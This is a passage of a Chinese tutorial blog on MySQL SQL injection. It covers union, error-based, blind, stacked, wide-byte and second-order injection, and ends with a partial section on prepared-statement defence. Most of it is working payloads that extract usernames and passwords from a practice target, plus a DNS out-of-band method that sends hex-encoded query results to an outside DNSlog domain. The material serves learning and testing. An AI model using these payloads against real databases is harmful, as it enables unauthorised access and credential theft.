<code>SELECT</code> 语句必须拥有相同数量的列。</li><li>列也必须拥有相似的数据类型。</li><li>每个 SELECT 语句中的列的顺序必须相同。</li></ul><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><ol><li>判断字段数（ 列数 ）</li><li>确定回显点 （ 数据显示在页面的位置 ）</li><li>数据查询</li></ol><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> # 正常<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span># 错误, 证明字段数为 <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>原理：<code>order by</code> 可以将查询的结果按照字段排序后再返回数据。当 <code>order by</code> 一个超出索引范围的值时,由于没有索引对应的那个字段，<code>order by</code> 也就无法按照其字段进行排序,自然就会报错。</p><h4 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><code>?id=-1</code> 可以让原因的 <code>SELECT</code> 查询结果为空，那么原有的查询结果就为空，<code>UNION</code> 拼接的 <code>SELECT</code> 语句的查询结果也就顶替了之前结果回显的位置。</p><p><code>union select</code> 除过 <code>1,2,3,4</code> 之外还可以使用如 <code>&#39;a&#39;,&#39;b&#39;,&#39;c&#39;</code> 或者 <code>null,null,null</code> 来进行填充。</p><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>数据查询的一般流程：</p><ol><li>查询数据库名</li><li>查询数据表名</li><li>查询数据表中的列名</li><li>查询具体数据</li></ol><p>Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-number">1.</span> 查询数据库名, 版本<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">3</span> <br># <span class="hljs-number">2.</span> 从 information_schema.schemata 中查询 schema_name ( 数据库名 )<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">3</span> <br># <span class="hljs-number">3.</span> 从 information_schema.tables 中查询 table_name ( 表名 )<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">1</span>),<span class="hljs-number">3</span> <br># <span class="hljs-number">4.</span> 从 information_schema.columns 中查询 column_name ( 列名 )<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">1</span>),<span class="hljs-number">3</span><br># <span class="hljs-number">5.</span> 数据查询<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/MySql%2520%25E6%258A%25A5%25E9%2594%2599%25E6%25B3%25A8%25E5%2585%25A5.png" alt="MySql 报错注入"></p><h3 id="主键重复报错"><a href="#主键重复报错" class="headerlink" title="主键重复报错"></a>主键重复报错</h3><p>主键重复错误,报错时会将查询结果显示出来</p><p>Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> 语句),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <br></code></pre></td></tr></table></figure><p>Payload 分析：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">count</span>()#返回某列的行数<br>concat()#拼接字符串<br><span class="hljs-built_in">floor</span>()#向下取整<br>rand()#产生<span class="hljs-number">0</span><span class="hljs-operator">~</span><span class="hljs-number">1</span>的随机数<br>rand(<span class="hljs-number">0</span>)#固定的一个数<br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> column_name#查询结果时按column_name进行分组的数据显示的<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)#产生<span class="hljs-number">011011.</span>...这种有规律的数<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> column_name;<br></code></pre></td></tr></table></figure><p>遇到这样按 <code>column_name</code> 分组并记录行数时,它的执行过程为：</p><ul><li><p>创建一个虚拟表，一个字段为 key(主键)，一个为 count(计数)，然后看分组依据 column_name，如果 key 有，就 count++，没有就插入key值再++</p></li><li><p>创建一个虚拟表,一个字段为 key(主键),一个为 count(计数),然后看分组依据 column_name,如果 key 有,就 count++，没有就插入key值再++</p></li></ul><p>那么报错语句的流程是:</p><ol><li>看x,x&#x3D;0,key中没有,插入x,这里x是floor(rand(0)*2)的别名,所以插入过程中又调用了floor(rand(0)*2)一次,所以插入的key应该是第二次的值1</li><li>看x,x&#x3D;1,key中存在,count++</li><li>看x,x&#x3D;0,key中没有,准备插入x,这里就又调用了一次,所以又插入了一次key&#x3D;1,但key中已经有1了,造成主键重复报错</li></ol><p><code>information_schema.tables</code> 是为了生成足够的 <code>011011011...</code></p><p>报错语句:</p><p><code>(select concat((payload),floor(rand(0)*2))x,count(*) from information_schema.tables group by x)</code>返回数据后，<code>select 1 from a;</code> 将数据作为一个表去查询,<code>a</code> 是查询结果的别名。</p><p>靶场演示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;username:&#x27;</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-string">&#x27;password:&#x27;</span>,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20220323183836712.png" alt="image-20220323183836712"></p><h3 id="xpath语法报错"><a href="#xpath语法报错" class="headerlink" title="xpath语法报错"></a>xpath语法报错</h3><p><code>xpath</code> 参数应该是 <code>/xxx/xxx/xxx/… </code> 这种格式，当我们写入其他格式时，xpath语法错误，报错同时返回查询结果。</p><h4 id="1-extractvalue"><a href="#1-extractvalue" class="headerlink" title="1.extractvalue"></a>1.extractvalue</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> extractvalue(&quot;anything&quot;,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> 语句))))<br></code></pre></td></tr></table></figure><p>payload分析：</p><ul><li><code>extractvalue(xml_frag, xpath_expr)</code> 函数使用 <code>XPath</code> 表示法从 <code>XML</code> 字符串中提取值</li><li><code>xml_frag</code>  目标xml文档</li><li><code>xpath_expr</code> 利用Xpath路径法表示的查找路径</li></ul><p>注意事项：</p><ul><li><code>~</code>可以换成<code>#</code>、<code>$</code> 等不满足 <code>xpath</code> 格式的字符</li><li><code>extractvalue()</code> 能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用 <code>substring()</code> 函数截取或 <code>limit</code> 分页，一次查看最多32位</li></ul><p>靶场演示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> extractvalue(&quot;anything&quot;,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;username:&#x27;</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-string">&#x27;password:&#x27;</span>,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))))<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20220323194142805.png" alt="image-20220323194142805"></p><h4 id="2-updatexml"><a href="#2-updatexml" class="headerlink" title="2.updatexml"></a>2.updatexml</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(&quot;anything&quot;,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> 语句)),&quot;anything&quot;))<br></code></pre></td></tr></table></figure><ul><li><code>updatexml(XML_document, XPath_string, new_value)</code> 改变文档中符合条件的节点的值</li><li><code>XML_document</code>：String格式，为XML文档对象的名称</li><li><code>XPath_string</code> ：Xpath格式的字符串</li><li><code>new_value</code>：String格式，替换查找到的符合条件的数据</li></ul><p>靶场演示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(&quot;anything&quot;,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;username:&#x27;</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-string">&#x27;password:&#x27;</span>,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),&quot;anything&quot;))<br></code></pre></td></tr></table></figure><h3 id="数值溢出报错"><a href="#数值溢出报错" class="headerlink" title="数值溢出报错"></a>数值溢出报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> 语句)x))<br></code></pre></td></tr></table></figure><p>Payload 分析：</p><p><code>exp()</code>是以e为底的指数函数，但是如果传递的数太大了，当大于709时，exp()就会因为溢出而报错(DOUBLE 值超出)。</p><p>利用溢出特性和双层嵌套查询，使数据库将错误信息返回，(数据库优先执行括号语句)这时，双层语句内部就会执行，但是它不会回退，所以就带着第一层语句+信息返回，达到我们目的。</p><p>靶场演示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) and exp(~(select * from(select concat(&#x27;</span>username:<span class="hljs-string">&#x27;,username,0x7e,&#x27;</span>password:<span class="hljs-string">&#x27;,password) from users limit 1,1)x))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20220323210023804.png" alt="image-20220323210023804"></p><h3 id="非法几何报错"><a href="#非法几何报错" class="headerlink" title="非法几何报错"></a>非法几何报错</h3><p>几何函数的参数不满足，无法构成几何对象，产生报错(非法几何)，报错信息中返回查询结果。</p><h4 id="1-geometrycollection"><a href="#1-geometrycollection" class="headerlink" title="1.geometrycollection"></a>1.geometrycollection</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> geometrycollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> 语句)a)b))<br></code></pre></td></tr></table></figure><p><code>GeometryCollection</code> 是由1个或多个任意类几何对象构成的几何对象。</p><p><code>GeometryCollection</code> 中的所有元素必须具有相同的空间参考系（即相同的坐标系)</p><p><code>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</code></p><p>靶场演示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) and geometrycollection((select * from(select * from(select concat(&#x27;</span>username:<span class="hljs-string">&#x27;,username,0x7e,&#x27;</span>password:<span class="hljs-string">&#x27;,password) from users limit 1,1)a)b)) --+</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20220323211704841.png" alt="image-20220323211704841"></p><h4 id="2-multipoint"><a href="#2-multipoint" class="headerlink" title="2.multipoint"></a>2.multipoint</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> 语句)a)b))<br></code></pre></td></tr></table></figure><p><code>MultiPoint</code>是一种由<code>Point</code>元素构成的几何对象集合。这些点未以任何方式连接或排序。</p><h4 id="3-polygon"><a href="#3-polygon" class="headerlink" title="3.polygon"></a>3.polygon</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> 语句)a)b))<br></code></pre></td></tr></table></figure><h4 id="4-multipolygon"><a href="#4-multipolygon" class="headerlink" title="4.multipolygon"></a>4.multipolygon</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> 语句)a)b))<br></code></pre></td></tr></table></figure><h4 id="5-linestring"><a href="#5-linestring" class="headerlink" title="5.linestring"></a>5.linestring</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><h4 id="6-multilinestring"><a href="#6-multilinestring" class="headerlink" title="6.multilinestring"></a>6.multilinestring</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> 语句)a)b))<br></code></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注就是页面没有回显，也没有报错回显的情况。</p><h3 id="盲注流程"><a href="#盲注流程" class="headerlink" title="盲注流程"></a>盲注流程</h3><p>由于页面不能回显字符，也就无法直接获取到具体的字符。</p><p>需要通过 “布尔 &#x2F; 延时” 的方法来判断具体的字符是什么？</p><p>一般的方法是：</p><ol><li>判断要查询数据的 “个数，字符长度”</li><li>通过”布尔&#x2F;延时”的方式判断具体的字符 （ 具体字母，ASCII 码 ）</li></ol><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-number">1.</span> 判断当前数据库(table_schema<span class="hljs-operator">=</span>database())中表的个数 <span class="hljs-operator">=</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span>  <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())<span class="hljs-operator">=</span><span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br># <span class="hljs-number">2.</span> 判断当前数据库中第一个(limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)表的表名长度(length(table_name))<br><span class="hljs-keyword">and</span>  length((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">6</span><br># <span class="hljs-number">3.</span> 判断第一个数据表中第一个字符的 <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;u&#x27;</span><br><span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;u&#x27;</span><br># <span class="hljs-number">3.</span> 判断第一个数据表中第一个字符的ASCII码 <span class="hljs-operator">=</span> <span class="hljs-number">115</span><br><span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span><br></code></pre></td></tr></table></figure><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 如果 expr 表达式的结果为 <span class="hljs-literal">true</span>, sleep n 秒, expr 其实就是布尔盲注的 Payload<br>if(expr,sleep(n),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h3><p>堆叠查询是指一次执行多条 <code>SQL</code> 语句，直接使用 <code>;</code> 隔开。</p><h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>在原有的 <code>SQL</code> 语句后面执行一条新的 <code>SQL</code> 语句。</p><p>堆叠注入主要是后端执行 <code>SQL</code> 语句时，使用了不恰当的函数，这些函数可以执行多条 <code>SQL</code> 语句，从而导致堆叠注入的发送。</p><p>比如 PHP 中的函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)<br><span class="hljs-title function_ invoke__">multi_query</span>(<span class="hljs-variable">$sql</span>)<br></code></pre></td></tr></table></figure><p>堆叠注入中，可以执行各种动词的SQL命令，比如 <code>show, alert</code> 这种，危害更大。</p><h2 id="转义对抗"><a href="#转义对抗" class="headerlink" title="转义对抗"></a>转义对抗</h2><p>对于 SQL 注入的防御方法，核心思想是转义。将边界限定为单引号，参数中的内容统一进行一次转义，使之成为真正的数据。</p><p>只要数据无法逃逸出边界，便永远无法逃逸出边界，无法改变逻辑。</p><p>攻防是相对的。有转义机制就有对抗转义的方法。其中，最为典型的两个思想是 <strong><code>宽字节注入</code></strong> 和 **<code>二次注入</code>**。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节注入的思想是提交宽字节编码的半个字符，利用这半个字符和转义后的转义符 (<code>\</code>) 结合，”吃掉” 转义符，留下单独的单引号去闭合SQL语句。</p><p>宽字节注入有一个前提条件，就是服务器脚本连接数据库时使用的是”宽字节”编码，且该编码中含有低字节位，如 <code>0x5C</code> 的字符，即转义符 <code>\</code>。</p><p>比如在 <code>GBK, Big5</code> 这些字符集都存在宽字节注入的问题。</p><p>以 <code>GBK</code> 为例，<code>%df</code> 和转义符  <code>%5C</code>  合并后 <code>%df%5C</code> 是一个 GBK 编码中的 “運” ( 运的繁体 ) ，导致转义符被 “吃掉”，可正常闭合 SQL 语句。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/SQL.png" alt="SQL"></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>在被转义的字符准备存入数据库之前，都会对这些字符进行一次”反转义”，目的是将没有转义的字符存入数据库。</p><p>当再次从数据库中取出数据带入 SQL 语句进行查询时，这个时候的字符时没有转义的，也就造成了这个 SQL 语句的闭合，造成 SQL 注入。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/%25E4%25BA%258C%25E6%25AC%25A1%25E6%25B3%25A8%25E5%2585%25A5.png" alt="二次注入"></p><p>这个漏洞主要靠白盒审计。</p><h2 id="DNS-查询注入"><a href="#DNS-查询注入" class="headerlink" title="DNS 查询注入"></a>DNS 查询注入</h2><p>除了直接回显、错误回显、无回显之外，还有一种思路与它们不同，也就是”外带法”，既然页面无法回显，那么就想办法将要查询的数据外带出来。</p><p>这里的”外带”使用的是 DNS 协议，将数据外带到 DNSlog ( 域名解析的日志 ) 这里。</p><p>比如：域名是 <code>34880287.ipv6.1433.eu.org</code> ，我这里请求一个 <code>fuyoumingyan.34880287.ipv6.1433.eu.org</code> 这个域名，请求之后，域名服务器就会记录下这个解析。一般外带的数据是放在域名前缀这里的，也就是 <code>fuyoumingyan</code>。</p><p>MySql 中实现 DNS 外带注入的方法：</p><ul><li><code>load_file</code> + <code>windows UNC</code> 读取其他域名下的文件</li></ul><p><code>load_file</code> 函数用于读取文件，在 <code>MySql &gt; 5.7.16</code> 后 <code>secure_file_priv</code> 的值默认为 <code>NULL</code> ，也就只能读取指定的安全文件路径。不过在  <code>secure_file_priv</code> 为空，也就是没有任何设置的时候，<code>load_file</code> 是可以读取任意路径的，再加上 windows 下的 UNC 语法就可以实现域名下的文件读取。</p><p><code>UNC</code> 是一种命名惯例，主要用于再 windows 系统上指定和映射网络驱动器。其可以使用特定的标记法来识别网络资源，命名语法由服务器名、共享名和一个可选的文件路径组成。语法如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">\\<span class="hljs-keyword">server</span>\<span class="hljs-keyword">share</span>\file_path<br></code></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;//&#x27;</span>,(<span class="hljs-keyword">select</span> hex(数据) <span class="hljs-keyword">from</span> 表),<span class="hljs-string">&#x27;.34880287.ipv6.1433.eu.org/1.txt&#x27;</span>));<br></code></pre></td></tr></table></figure><p>因为域名对字符的限制，所以使用 <code>hex()</code> 对查询的数据进行了一下编码。</p><p>本地测试一下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 测试是否存在<span class="hljs-keyword">SQL</span>注入<br><span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;//17897fa1.ipv6.1433.eu.org/1.txt&#x27;</span>));<br># 外带数据<br><span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;//&#x27;</span>,(<span class="hljs-keyword">select</span> hex(<span class="hljs-keyword">user</span>())),<span class="hljs-string">&#x27;.17897fa1.ipv6.1433.eu.org/1.txt&#x27;</span>));<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230522232214082.png" alt="image-20230522232214082"></p><h2 id="SQL防御"><a href="#SQL防御" class="headerlink" title="SQL防御"></a>SQL防御</h2><p>采用 sql 语句预编译和绑定变量，是防御 sql 注入的最佳方法。</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>在 MySQL 中，可以使用预编译语句（Prepared Statements）来执行参数化查询，从而提高性能和安全性。预编译语句允许我们预先准备查询模板，然后将参数传递给该模板进行执行，避免了每次执行查询都要解析和编译 SQL 的开销，同时也可以有效防止 SQL 注入攻击。</p><p>MySql 预编译的一般步骤 ( 其他脚本语言类似，因为可以利用 MySql 的预编译达到绕过的效果这里写一下 )：</p><ol><li>准备预编译语句</li><li>绑定参数</li><li>执行预编译语句</li><li>获取结果</li><li>清理资源</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-number">1.</span> 准备预编译语句 <span class="hljs-keyword">prepare</span><br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SELECT * FROM table WHERE column = ?&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> statement_name <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@sql</span>;<br># <span class="hljs-number">2.</span> 设置参数<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@param1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;value&#x27;</span>;<br># <span class="hljs-number">3.</span> 将参数绑定到预编译语句中, 再使用 <span class="hljs-keyword">execute</span> 执行预编译语句<br><span class="hljs-keyword">EXECUTE</span> statement_name <span class="hljs-keyword">USING</span> <span class="hljs-variable">@param1</span>;<br># <span class="hljs-number">4.</span> 